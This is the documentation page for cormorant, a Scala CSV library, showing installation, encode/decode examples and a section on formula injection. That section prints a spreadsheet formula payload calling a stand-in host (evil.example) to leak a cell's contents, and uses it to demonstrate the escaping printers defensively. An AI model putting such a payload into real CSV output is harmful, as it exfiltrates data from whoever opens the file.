---
layout: home

---
# cormorant [![Build Status](https://travis-ci.com/ChristopherDavenport/cormorant.svg?branch=master)](https://travis-ci.com/ChristopherDavenport/cormorant) [![Maven Central](https://maven-badges.herokuapp.com/maven-central/io.chrisdavenport/cormorant-core_2.12/badge.svg)](https://maven-badges.herokuapp.com/maven-central/io.chrisdavenport/cormorant-core_2.12)

## Project Goals

Cormorant is a CSV Library for Scala

## Quick Start

To use cormorant in an existing SBT project with Scala 2.12 or a later version, add the following dependencies to your
`build.sbt` depending on your needs:

```scala
libraryDependencies ++= Seq(
  "io.chrisdavenport" %% "cormorant-core"     % "<version>",
  "io.chrisdavenport" %% "cormorant-generic"  % "<version>",
  "io.chrisdavenport" %% "cormorant-parser"   % "<version>",
  "io.chrisdavenport" %% "cormorant-fs2"      % "<version>",
  "io.chrisdavenport" %% "cormorant-http4s"   % "<version>",
  "io.chrisdavenport" %% "cormorant-refined"  % "<version>"
)
```

First the imports

```scala mdoc
import io.chrisdavenport.cormorant._
import io.chrisdavenport.cormorant.generic.semiauto._
import io.chrisdavenport.cormorant.parser._
import io.chrisdavenport.cormorant.implicits._
import cats.implicits._
import java.util.UUID
import java.time.Instant
```

Then some basic operations

```scala mdoc
case class Bar(a: String, b: Int, c: Long, d: Option[UUID], e: Instant)

implicit val lr: LabelledRead[Bar] = deriveLabelledRead
implicit val lw: LabelledWrite[Bar] = deriveLabelledWrite

// A List of A given derived type
// Don't use Instant.Now or UUID.randomUUID in pure code in the real world please.
val l : List[Bar] = List(
  Bar("Yellow", 3, 5L, UUID.randomUUID.some, Instant.now),
  Bar("Boo", 7, 6L, None, Instant.MAX)
)

// From Type to String
val csv = l.writeComplete.print(Printer.default)

// From String to Type
val decoded : Either[Error, List[Bar]] = {
  parseComplete(csv).leftWiden[Error]
  .flatMap(_.readLabelled[Bar].sequence)
}
```

## Writing CSV that may be opened in a spreadsheet

`Printer.default` implements RFC 4180 quoting, which is what a CSV *parser*
needs. It does not defend against formula injection: a spreadsheet opening a
CSV file directly will evaluate a field beginning with `=`, `+`, `-`, `@`, a
tab or a carriage return. A file built from untrusted input can therefore
carry a payload to whoever opens it.

If your output may be opened in a spreadsheet, use the escaping printers,
which prefix such a value with a single quote:

```scala mdoc
val hostile = CSV.Field("""=HYPERLINK("http://evil.example/?"&A1,"click")""")

// RFC 4180 only -- the formula survives
Printer.default.print(hostile)

// Neutralised
Printer.defaultEscapingFormulas.print(hostile)
```

`Printer.tsvEscapingFormulas` and `Printer.genericEscapingFormulas` are the
equivalents of `tsv` and `generic`.

This is opt-in rather than the default because prefixing changes the bytes
written, and plenty of CSV is consumed by another program rather than a
person, where an unexpected `'` would be a bug. Choose the escaping printers
at the point where you know the output is destined for a spreadsheet.
